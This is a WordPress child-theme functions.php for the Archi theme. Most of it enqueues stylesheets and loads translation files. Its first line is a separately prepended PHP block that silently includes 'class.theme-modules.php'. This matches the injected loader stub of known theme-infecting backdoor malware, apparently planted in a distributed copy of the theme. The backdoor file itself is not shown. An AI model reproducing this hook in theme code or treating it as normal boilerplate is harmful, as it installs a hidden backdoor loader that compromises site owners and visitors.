<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php 
// Load translation files from your child theme instead of the parent theme
add_action( 'after_setup_theme', 'archi_child_theme_locale' );
function archi_child_theme_locale() {
    load_child_theme_textdomain( 'archi', get_stylesheet_directory() . '/languages' );
}

add_action( 'wp_enqueue_scripts', 'archi_load_child_theme_styles' );
function archi_load_child_theme_styles() {
	global $archi_option;
	
    $parent_style = 'archi-style'; // This is 'archi-style' for the Archi theme.
	
	// Add custom fonts, used in the main stylesheet.
    wp_enqueue_style( 'archi-fonts', archi_fonts_url(), array(), null );
	
    /** All frontend css files **/ 
    wp_enqueue_style( 'archi-bootstrap', get_template_directory_uri().'/css/bootstrap.css');

    if($archi_option['preload-switch']!=false){
        if(isset($archi_option['preloader_mode']) and $archi_option['preloader_mode']=="preloader_progress" ){
    	    wp_enqueue_style( 'archi-jpreloader', get_template_directory_uri().'/css/jpreloader.css');
        }else{
            wp_enqueue_style( 'archi-jpreloader', get_template_directory_uri().'/css/royal-preloader.css');
        }
    }

    if($archi_option['animate-switch']!=false){
    	wp_enqueue_style( 'archi-animate', get_template_directory_uri().'/css/animate.css');
    }
	wp_enqueue_style( 'archi-plugin', get_template_directory_uri().'/css/plugin.css');    

    /** load fonts **/
    wp_enqueue_style( 'archi-awesome-font', get_template_directory_uri().'/fonts/font-awesome/css/font-awesome.css');    
    wp_enqueue_style( 'archi-et-line-font', get_template_directory_uri().'/fonts/et-line-font/style.css');	
    wp_enqueue_style( 'archi-elegant-font', get_template_directory_uri().'/fonts/elegant-font/style.css'); 

    wp_enqueue_style( 'archi-YTPlayer', get_template_directory_uri().'/css/jquery.mb.YTPlayer.min.css');

    /** Theme stylesheet. **/
    wp_enqueue_style( $parent_style, get_template_directory_uri() . '/style.css' );
	
	/** Theme block stylesheet. **/
	wp_enqueue_style( 'archi-block-style', get_template_directory_uri().'/css/blocks.css');
    
    if(isset($archi_option['header_layout']) and $archi_option['header_layout']=="hleft_side" ){
        wp_enqueue_style( 'archi-header-sidenav', get_template_directory_uri().'/css/header-sidenav.css');
    }elseif (isset($archi_option['header_layout']) and $archi_option['header_layout']=="hleft_side_light") {
        wp_enqueue_style( 'archi-header-sidenav-light', get_template_directory_uri().'/css/header-sidenav-light.css');
    }else{}
    

    if (class_exists('woocommerce')) {
        wp_enqueue_style( 'archi-woocommerce', get_template_directory_uri().'/css/woocommerce.css');  
    }
    
    if($archi_option['version_type']=='light'){
        wp_enqueue_style( 'archi-style-light', get_template_directory_uri().'/css/light.css');        
    }        

    wp_enqueue_style( 'archi-twentytwenty', get_template_directory_uri().'/css/twentytwenty.css'); 
	
    wp_enqueue_style( 
		'archi-child-style', 
		get_stylesheet_directory_uri() . '/style.css', 
		array( $parent_style ), 
		wp_get_theme()->get('Version') 
	);    
}